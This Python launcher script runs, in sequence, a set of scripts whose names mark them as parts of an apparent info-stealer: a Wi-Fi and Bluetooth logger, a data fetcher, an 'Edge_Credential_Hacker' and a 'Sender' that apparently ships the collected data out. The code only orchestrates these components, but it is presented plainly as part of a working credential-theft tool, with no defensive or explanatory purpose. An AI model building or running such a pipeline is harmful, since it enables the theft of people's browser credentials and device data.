import os
import subprocess
from pathlib import Path

def run_all_scripts(target_directory):
    # Ensure the target directory exists
    if not os.path.exists(target_directory):
        print(f"Target directory '{target_directory}' does not exist.")
        return

    # List of scripts to run
    scripts = [
        "Log_File_Creator.py",
        "Wifi_Bluetooth_Logger.py",
        "Data_Fetcher.py",
        "Edge_Credential_Hacker.py",
        "Sender.py"
    ]

    for script in scripts:
        script_path = Path(target_directory) / script
        if script_path.exists():
            print(f"Running {script}...")
            subprocess.run(["python", str(script_path)], check=True)
        else:
            print(f"Script '{script}' not found in '{target_directory}'.")

if __name__ == "__main__":
    script_folder = Path(__file__).resolve().parent
    run_all_scripts(script_folder)